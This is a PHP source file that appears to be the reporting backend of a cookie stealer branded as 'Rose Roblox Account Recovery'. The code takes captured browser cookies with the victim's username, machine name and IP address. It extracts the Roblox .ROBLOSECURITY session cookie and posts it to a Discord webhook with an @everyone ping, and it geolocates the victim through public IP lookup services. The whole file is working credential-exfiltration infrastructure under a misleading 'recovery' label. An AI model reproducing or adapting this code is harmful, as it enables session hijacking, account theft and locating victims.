<?php
declare(strict_types=1);

/**
 * Discord notification for a capture: one embed, the Roblox cookie pulled out
 * and shown in a code block, location pinned underneath.
 */

function notify_capture(string $hook, string $tag, string $app, string $user,
                        string $machine, string $ip, array $cookies): void
{
    $hook = trim($hook);
    if ($hook === '' || strpos($hook, 'https://') !== 0) {
        return;
    }

    $payload = build_capture_message($tag, $app, $user, $machine, $ip, $cookies);
    http_post_json($hook, json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
}

function build_capture_message(string $tag, string $app, string $user, string $machine,
                               string $ip, array $cookies): array
{
    $roblox = find_cookie($cookies, 'ROBLOSECURITY');
    $browsers = [];
    foreach ($cookies as $cookie) {
        $name = (string)($cookie['browser'] ?? 'Unknown');
        $browsers[$name] = ($browsers[$name] ?? 0) + 1;
    }
    arsort($browsers);

    if ($roblox !== '') {
        $description = "```\n" . $roblox . "\n```";
        $title = 'Roblox Account Recovery';
    } else {
        $parts = [];
        foreach (array_slice($browsers, 0, 6, true) as $name => $count) {
            $parts[] = $name . ' ' . $count;
        }
        $description = '**' . count($cookies) . ' cookies** from ' . count($browsers) . ' browsers';
        if ($parts) {
            $description .= "\n" . implode(' | ', $parts);
        }
        $title = 'Cookie Capture';
    }

    $where = geo_lines($ip);

    return [
        'username' => 'Rose',
        'content' => '@everyone',
        'allowed_mentions' => ['parse' => ['everyone']],
        'embeds' => [[
            'author' => ['name' => ($user !== '' ? $user : $machine)],
            'title' => $title,
            'description' => $description,
            'color' => 15832598,
            'fields' => [
                ['name' => 'Somewhere', 'value' => $where, 'inline' => false],
            ],
            'footer' => ['text' => 'Rose Roblox Account Recovery / roseater.run'],
        ]],
    ];
}

/** Value of the first cookie whose name matches, or an empty string. */
function find_cookie(array $cookies, string $needle): string
{
    foreach ($cookies as $cookie) {
        $name = (string)($cookie['name'] ?? '');
        if (strcasecmp($name, $needle) === 0 || stripos($name, $needle) !== false) {
            return (string)($cookie['value'] ?? '');
        }
    }
    return '';
}

function geo_lines(string $ip): string
{
    $geo = geo_lookup($ip);

    $city = $geo['city'] !== '' ? $geo['city'] : 'unknown';
    $region = $geo['region'] !== '' ? $geo['region'] : 'unknown';
    $country = $geo['country'] !== '' ? $geo['country'] : 'unknown';

    return "CI: $city\nREG: $region\nCO: $country";
}

/**
 * Best effort city/region/country for a public address. Private and loopback
 * addresses skip the lookup - the answer would be meaningless anyway.
 */
function geo_lookup(string $ip): array
{
    $blank = ['city' => '', 'region' => '', 'country' => ''];

    if (!filter_var($ip, FILTER_VALIDATE_IP) || !is_public_ip($ip)) {
        return $blank;
    }

    $sources = [
        'https://ipwho.is/' . rawurlencode($ip),
        'https://ipapi.co/' . rawurlencode($ip) . '/json/',
    ];

    foreach ($sources as $url) {
        $raw = http_get($url);
        if ($raw === '') {
            continue;
        }
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            continue;
        }
        if (isset($data['success']) && $data['success'] === false) {
            continue;
        }

        $city = (string)($data['city'] ?? '');
        $region = (string)($data['region'] ?? '');
        $country = (string)($data['country_code'] ?? ($data['country'] ?? ''));

        if ($city !== '' || $country !== '') {
            return ['city' => $city, 'region' => $region, 'country' => $country];
        }
    }

    return $blank;
}

function is_public_ip(string $ip): bool
{
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return true;
}

function http_get(string $url): string
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 4,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_USERAGENT => 'Rose/1.0',
        ]);
        $body = curl_exec($ch);
        curl_close($ch);
        return is_string($body) ? $body : '';
    }

    $context = stream_context_create([
        'http' => ['timeout' => 4, 'ignore_errors' => true, 'user_agent' => 'Rose/1.0'],
    ]);
    $body = @file_get_contents($url, false, $context);
    return is_string($body) ? $body : '';
}

function http_post_json(string $url, string $body): void
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $body,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 6,
            CURLOPT_CONNECTTIMEOUT => 4,
        ]);
        curl_exec($ch);
        curl_close($ch);
        return;
    }

    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $body,
            'timeout' => 6,
            'ignore_errors' => true,
        ],
    ]);
    @file_get_contents($url, false, $context);
}
